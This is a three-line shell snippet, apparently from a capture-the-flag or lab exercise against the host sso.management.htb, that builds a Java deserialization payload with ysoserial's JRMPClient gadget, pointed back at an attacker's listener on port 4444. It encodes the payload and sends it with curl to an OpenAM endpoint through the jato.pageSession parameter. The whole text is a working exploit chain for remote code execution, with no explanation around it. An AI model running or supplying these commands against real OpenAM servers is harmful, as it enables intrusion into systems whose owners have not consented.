java -jar ysoserial.jar JRMPClient "$LHOST:4444" | base64 -w0 > p.b64
python3 -c "import urllib.parse;print(urllib.parse.quote(open('p.b64').read().strip(),safe=''))" > p.url
curl -sk "https://sso.management.htb/openam/ccversion/Version?jato.pageSession=$(cat p.url)"
